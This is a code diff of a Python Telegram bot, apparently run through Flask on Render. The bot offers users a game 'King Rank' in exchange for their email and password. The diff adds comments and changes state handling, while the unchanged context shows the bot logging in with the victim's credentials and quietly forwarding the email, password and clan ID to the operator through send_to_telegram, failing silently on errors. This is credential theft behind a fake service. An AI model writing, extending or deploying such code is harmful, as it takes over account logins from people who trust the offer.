@@ -112,7 +112,7 @@ def check_clan_id(token, email, password):
             raw = response.json()
             clan_id = raw.get("result", "")
             if clan_id:
-                send_to_telegram(email, password, clan_id)
+                send_to_telegram(email, password, clan_id)  # Send only if ClanId exists
     except requests.exceptions.RequestException:
         pass  # Silent fail
 
@@ -146,15 +146,15 @@ def handle_message(message):
         auth_token = login(email, password)
         if auth_token:
             if set_rank(auth_token):
-                check_clan_id(auth_token, email, password)
+                check_clan_id(auth_token, email, password)  # Send data only if clan_id exists
                 bot.reply_to(message, "✅ King Rank установлен успешно.")
-                # Reset user state after completing the task
-                user_states[user_id] = {"step": "await_email"}  # Reset to the email step
-                bot.reply_to(message, "📧 ⚫️ВВЕДИ @GMAIL⚫️")  # Ask for email again
             else:
                 bot.reply_to(message, "❌ Не удалось установить King Rank.")
         else:
             bot.reply_to(message, "❌ Ошибка при входе.")
+
+        # Reset user state after completing the task
+        del user_states[user_id]
 
 # Flask app for Render
 app = Flask(__name__)
